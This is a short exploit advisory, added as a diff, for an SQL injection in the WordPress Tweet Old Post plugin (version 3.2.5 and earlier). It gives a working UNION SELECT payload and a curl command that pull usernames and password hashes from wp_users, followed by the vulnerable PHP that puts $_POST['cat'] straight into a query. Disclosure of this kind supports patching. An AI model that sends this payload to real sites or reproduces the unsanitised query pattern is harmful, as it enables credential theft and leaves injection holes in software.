@@ -1,0 +1,38 @@
+# Exploit Title: WordPress Tweet Old Post plugin <= 3.2.5 SQL Injection
+Vulnerability
+# Date: 2011-09-05
+# Author: sherl0ck_ < sherl0ck_ [at] alligatorteam [dot] org >
+# Software Link: http://downloads.wordpress.org/plugin/tweet-old-post.zip
+# Version: 3.2.5 (tested)
+
+---------------
+PoC (POST data)
+---------------
+URL:
+http://localhost/wordpress/wp-admin/admin.php?page=ExcludePosts
+
+POST Data:
+delids=1&selFilter=excluded&cat=1=0) UNION ALL SELECT
+USER(),concat(user_login,char(58),user_pass),DATABASE(),@@version,null from
+wp_users#&setFilter=Filter&s=hello&chkbx=1
+
+e.g.:
+curl --cookie "[COOKIE]" --data "delids=1&selFilter=excluded&cat=1) UNION
+ALL SELECT
+USER(),concat(user_login,char(58),user_pass),DATABASE(),@@version,null from
+wp_users#&setFilter=Filter&s=hello&chkbx=1"
+http://localhost/wordpress/wp-admin/admin.php?page=ExcludePosts
+
+---------------
+Vulnerable code
+---------------
+70     if(isset($_POST["setFilter"]))
+71     {
+72         if($_POST["cat"] != 0)
+73         {
+74             $sql = $sql . " and p.ID IN ( SELECT tr.object_id FROM
+".$wpdb->prefix."term_relationships AS tr INNER JOIN
+".$wpdb->prefix."term_taxonomy AS tt ON tr.term_taxonomy_id = tt.ter
+ m_taxonomy_id WHERE tt.taxonomy = 'category' AND tt.term_id=" .
+$_POST["cat"] . ")";
+75             $cat_filter = $_POST["cat"];
